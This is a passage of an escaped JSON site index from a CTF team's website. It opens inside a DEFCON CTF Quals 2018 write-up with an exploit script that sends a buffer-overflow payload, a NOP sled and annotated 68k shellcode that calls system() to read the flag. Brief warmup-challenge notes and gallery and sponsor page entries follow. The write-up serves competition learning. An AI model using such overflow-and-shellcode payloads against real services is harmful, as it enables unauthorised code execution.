\u0026#39;\\x2c\\x4f\\xb5\\x82\\x06\\x82\\x63\\x61\\x74\\x20\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x66\\x6c\\x61\\x67\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x3b\\x20\\x20\\x20\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x63\\x61\\x74\\x20\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x66\\x6c\\x61\\x67\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x3b\\x20\\x20\\x20\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x63\\x61\\x74\\x20\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x66\\x6c\\x61\\x67\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x3b\\x20\\x20\\x20\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x63\\x61\\x74\\x20\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x66\\x6c\\x61\\x67\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x3b\\x20\\x20\\x20\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x63\\x61\\x74\\x20\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x66\\x6c\\x61\\x67\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x3b\\x20\\x20\\x20\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x63\\x61\\x74\\x20\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x66\\x6c\\x61\\x67\\x2c\\xc2\\xb5\\x82\\x06\\x82\\x3b\\x20\\x20\\x20\\x2c\\xc2\\xb5\\x82\\x2c\\xc2\\x22\\x0f\\x59\\x8f\\x2e\\x81\\x2c\\x4f\\x45\\xf9\\x05\\x03\\x07\\xf8\\x4e\\x92\u0026#39; payload = \u0026#39;http://\u0026#39; payload += \u0026#39;a\u0026#39; * (259 - len(payload)) payload += \u0026#39;\\x03\\xff\\xf7\\xf8\u0026#39; * 8 payload += DOUBLE_NOP * 100 payload += shellcode while True: conn.recvuntil(\u0026#34;Welcome to the pre-alpha web aka \u0026#34;) token = conn.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] log.info(\u0026#34;Token : \u0026#34;+token) conn.recvuntil(\u0026#34;What URL would you like this old dog to fetch?\\n\u0026#34;) print \u0026#39;sending:\u0026#39; print payload print payload.encode(\u0026#39;hex\u0026#39;) conn.sendline(payload) i = 0 while True: cose = conn.recvuntil(\u0026#34;DEBUG \u0026#34;)[:-6] if(len(cose)\u0026gt;0): log.info(cose) b64 = base64.b64decode(conn.recvline()) f = open(\u0026#39;./\u0026#39;+str(filename) + \u0026#34;/image\u0026#34;+str(i).rjust(4,\u0026#34;0\u0026#34;)+\u0026#34;.png\u0026#34;,\u0026#34;w\u0026#34;) f.write(b64) f.close() log.info(\u0026#34;Saved image\u0026#34;+str(i)+\u0026#34;.png\u0026#34;) i += 1 Shellcode # \\x2c\\x4f ## moveal %sp,%fp \\xb5\\x82 ## eorl %d2,%d2 \\x06\\x82\\x63\\x61\\x74\\x20 ## addil #1667331104,%d2 --\u0026gt; \u0026#39;cat \u0026#39; \\x2c\\xc2 ## moveal %d2,%fp@+ \\xb5\\x82 ## eorl %d2,%d2 \\x06\\x82\\x66\\x6c\\x61\\x67 ## addil #1718378855,%d2 --\u0026gt; \u0026#39;flag\u0026#39; \\x2c\\xc2 ## moveal %d2,%fp@+ \\xb5\\x82 ## eorl %d2,%d2 \\x06\\x82\\x3b\\x20\\x20\\x20 ## addil #991961120,%d2 --\u0026gt; \u0026#39;; \u0026#39; \\x2c\\xc2 ## moveal %d2,%fp@+ . x4: we repeated \u0026#39;cat flag; \u0026#39; to make the . output appear under the browser window.. \\xb5\\x82 ## eorl %d2,%d2 \\x2c\\xc2 ## moveal %d2,%fp@+ \\x22\\x0f ## moveal %sp,%d1 \\x59\\x8f ## subql #4,%sp \\x2e\\x81 ## moveal %d1,%sp@ \\x2c\\x4f ## moveal %sp,%fp \\x45\\xf9\\x05\\x03\\x07\\xf8 ## lea 0x050307f8,%a2 --\u0026gt; system() address \\x4e\\x92 ## jsr %a2@ You Already Know # This was a simple warmup challenge. We were told that, if we could read the challenge description, we already knew the flag. Indeed, opening Chromium\u0026rsquo;s developer tools and inspecting the responses of the XHR request to retrieve the description in the scoreboard, the flag was hidden in plain sight inside a React comment. Really, we already knew.\n","date":"20 May 2018","externalUrl":null,"permalink":"/writeups/2018-05-20-defconctfquals-2018-all-writeups/","section":"","summary":"","title":"DEFCON CTF QUALS 2018 - Write ups","type":"writeups"},{"content":"Here\u0026rsquo;s a collection of photos showcasing our team\u0026rsquo;s journey, achievements, and memorable moments from various CTF competitions and events. From our early days to recent victories, these images capture the spirit of . ","externalUrl":null,"permalink":"/gallery/","section":"üì∑  Photo Gallery","summary":"","title":"üì∑  Photo Gallery","type":"gallery"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"We thank all our sponsors for their generous support, which allows us to participate in DEF CON CTF and other events. Their contributions help us cover travel expenses, equipment, and other costs associated with our participation.\nHere are the amazing sponsors who are supporting us this year:\n‚è∫ Gold Sponsors ‚è∫ Silver Sponsors ‚è∫ Supporters Academic Sponsors Our Legacy # Sponsors 2024 Platinum Sponsors # Gold Sponsors # Silver Sponsors # Academic Sponsors # Sponsors 2023 Platinum Sponsors # Gold Sponsors # Silver Sponsors # Supporters # Academic Sponsors # Sponsors 2021 We are thankful to our sponsors that made it possible for the mhackeroni team to take part in the DEF CON 29 CTF in August 2021.\nGold Sponsors # Silver Sponsors # Supporters # Academic Sponsors # Sponsors 2019 We are thankful to our sponsors that made it possible for the mhackeroni team to take part in the DEF CON 27 CTF in Las Vegas in August 2019.\nPlatinum Sponsors # Gold Sponsors # Silver Sponsors # Supporters # Academic Sponsors # Sponsors 2018 We thank all the sponsors and supporters that made it possible for the mhackeroni team to take part in the DEF CON 26 CTF finals in Las Vegas in August 2018, contributing to the success of our team!\nPlatinum Sponsors # Gold Sponsors # Silver Sponsors # Supporters # ","externalUrl":null,"permalink":"/sponsors/","section":"Sponsors","summary":"","title":"Sponsors","type":"sponsors"}]